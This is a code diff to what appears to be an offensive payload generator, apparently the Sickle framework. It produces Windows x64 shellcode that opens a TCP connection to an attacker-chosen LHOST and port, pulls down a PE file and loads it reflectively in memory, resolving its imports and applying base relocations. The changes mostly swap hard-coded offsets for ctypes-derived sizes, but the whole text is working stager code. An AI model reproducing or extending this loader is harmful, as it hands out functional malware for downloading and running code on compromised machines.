@@ -7,11 +7,13 @@ from sickle.common.lib.generic.mparser import argument_check
 from sickle.common.lib.generic.convert import port_str_to_htons
 from sickle.common.lib.generic.convert import from_str_to_xwords
 from sickle.common.lib.generic.convert import ip_str_to_inet_addr
-from sickle.common.lib.generic.convert import from_str_to_win_hash
+from sickle.common.lib.generic.convert import from_str_to_win_hash # consider rename this to str2whash
 
 from sickle.common.headers.windows import winternl
 from sickle.common.headers.windows import winnt
 from sickle.common.headers.windows import ntdef
+from sickle.common.headers.windows import ws2def
+from sickle.common.headers.windows import winternl
 
 from sickle.common.lib.programmer import instantiator
 
@@ -364,15 +366,13 @@ change_permissions:
         """
 
         stub = f"""
-; RAX = rvaToOffset(PIMAGE_NT_HEADERS64 pNtHeader, // RCX => lpNtHeader
-;                   DWORD dwVA);                   // R11 => lpNtHeader->OptionalHeader.DataDirectory[winnt.IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
 get_dwImportsOffset:
     xor r11, r11
     mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
     add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
     add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
     mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_IMPORT}
-    imul rax, 0x08
+    imul rax,{ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
     add rdx, rax
     xor rax, rax
     mov ax, [rdx]
@@ -381,17 +381,14 @@ get_dwImportsOffset:
     call rva2offset
     mov [rbp - {self.storage_offsets['dwImportsOffset']}], rax
 
-; PIMAGE_IMPORT_DESCRIPTOR lpImportData = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)pResponse + dwImportsOffset);
 get_lpImportData:
     mov rdx, [rbp - {self.storage_offsets['pResponse']}]
     add rdx, rax
     mov [rbp - {self.storage_offsets['lpImportData']}], rdx
 
-; while (lpImportData->Name != 0)
 parse_imports:
     mov rdx, [rbp - {self.storage_offsets['lpImportData']}]
 
-; PCHAR szDllName = (PCHAR)((DWORD_PTR)pResponse + rvaToOffset(lpNtHeader, lpImportData->Name));
 get_szDllName:
     xor r11, r11
     add rdx, {winnt._IMAGE_IMPORT_DESCRIPTOR.Name.offset}
@@ -402,7 +399,6 @@ get_szDllName:
     call rva2offset
     mov rdx, [rbp - {self.storage_offsets['pResponse']}]
 
-; HMODULE hLibraryHandle = LoadLibraryA(szDllName);
 get_hLibraryHandle:
     add rdx, rax 
     mov rcx, rdx
@@ -410,7 +406,6 @@ get_hLibraryHandle:
     call rax
     mov [rbp - {self.storage_offsets['hLibraryHandle']}], rax
 
-; PIMAGE_THUNK_DATA dwFThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)pResponse + rvaToOffset(lpNtHeader, lpImportData->FirstThunk));
 get_dwFThunk:
     xor r11, r11
     mov rdx, [rbp - {self.storage_offsets['lpImportData']}]
@@ -422,7 +417,6 @@ get_dwFThunk:
     add rdx, rax
     mov [rbp - {self.storage_offsets['dwFThunk']}], rdx
 
-; while (dwFThunk->u1.Function != 0)
 get_lpApiImport:
     mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
     add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset} ; AddressOfData
@@ -433,8 +427,6 @@ get_lpApiImport:
     add rdx, rax
     mov [rbp - {self.storage_offsets['lpApiImport']}], rdx
 
-; RAX => GetProcAddress([in] HMODULE hModule,     // RCX => hLibraryHandle
-;                       [in] LPCSTR  lpProcName); // RDX => (LPCSTR)lpApiImport->Name
 get_lpApiAddress:
     add rdx, {winnt._IMAGE_IMPORT_BY_NAME.Name.offset}
     mov rcx, [rbp - {self.storage_offsets['hLibraryHandle']}]
@@ -450,7 +442,7 @@ write_address:
 ; dwFThunk++;
 load_next_entry:
     mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
-    add rdx, 0x08
+    add rdx, {ctypes.sizeof(ctypes.c_uint64)}
     mov [rbp - {self.storage_offsets['dwFThunk']}], rdx
 
 check_next_done:
@@ -463,7 +455,7 @@ check_next_done:
 ; lpImportData++;
 next_dll:
     mov rdx, [rbp - {self.storage_offsets['lpImportData']}]
-    add rdx, 0x14
+    add rdx, {ctypes.sizeof(winnt._IMAGE_IMPORT_DESCRIPTOR)}
     mov [rbp - {self.storage_offsets['lpImportData']}], rdx
 
 check_dll_done:
@@ -548,7 +540,6 @@ calc_offset:
         """
 
         stub = f"""
-; pNtHeader->OptionalHeader.ImageBase = (DWORD64)lpvLoadedAddress;
 change_ImageBase:
     mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
     add r8, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
@@ -565,7 +556,7 @@ get_dwOffsetToBaseRelocationTable:
     add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
     add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
     mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC}
-    imul rax, 0x08
+    imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
     add rdx, rax
     xor rax, rax
     mov ax, [rdx]
@@ -580,10 +571,10 @@ get_dwTableSize:
     add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
     add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
     mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC}
-    imul rax, 0x08
+    imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
     add rdx, rax
     xor rcx, rcx
-    mov cx, [rdx + 0x4]
+    mov cx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]
     mov [rbp - {self.storage_offsets['dwTableSize']}], rcx
 
 ; PIMAGE_BASE_RELOCATION pBaseRelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pResponse + dwOffsetToBaseRelocationTable);
@@ -604,15 +595,15 @@ get_dwBlockSize:
 ; PWORD pwRelocEntry = (PWORD)((DWORD_PTR)pBaseRelocationTable + sizeof(IMAGE_BASE_RELOCATION));
 get_pwRelocEntry:
     mov rdx, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
-    add rdx, 0x08
+    add rdx, {ctypes.sizeof(winnt._IMAGE_BASE_RELOCATION)}
     mov [rbp - {self.storage_offsets['pwRelocEntry']}], rdx
 
 ; DWORD numEntries = (dwBlockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
 get_numEntries:
     mov rax, [rbp - {self.storage_offsets['dwBlockSize']}]
-    sub rax, 0x08
+    sub rax, {ctypes.sizeof(winnt._IMAGE_BASE_RELOCATION)}
     shr rax, 1
-    imul rax, 0x02
+    imul rax, {ctypes.sizeof(ctypes.c_uint16)}
     mov [rbp - {self.storage_offsets['numEntries']}], rax
     xor rax, rax
 
@@ -659,7 +650,7 @@ get_dwAddressOffset:
 
 init_next_entry:
     mov rax, [rbp - {self.storage_offsets['dwBlockIndex']}]
-    add rax, 0x2
+    add rax, {ctypes.sizeof(ctypes.c_uint16)}
     mov [rbp - {self.storage_offsets['dwBlockIndex']}], rax
     mov rcx, [rbp - {self.storage_offsets['numEntries']}]
     cmp rax, rcx
@@ -747,7 +738,7 @@ call_WSAStartup:
 ;               [in] int type,      // RDX => 0x01 (SOCK_STREAM)
 ;               [in] int protocol); // R8  => 0x06 (IPPROTO_TCP)
 call_socket:
-    mov rcx, 0x02
+    mov rcx, {ws2def.AF_INET}
     xor rdx, rdx
     inc dl
     xor r8, r8
@@ -760,7 +751,7 @@ call_socket:
 ;                [in] int namelen);         // R8  => 0x10
 call_connect:
     mov rcx, rax
-    mov r8, 0x10
+    mov r8, {ctypes.sizeof(ws2def.sockaddr)}
     lea rdx, [rbp - {self.storage_offsets['sockaddr_name']}]
     mov r9, {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
     mov [rdx], r9
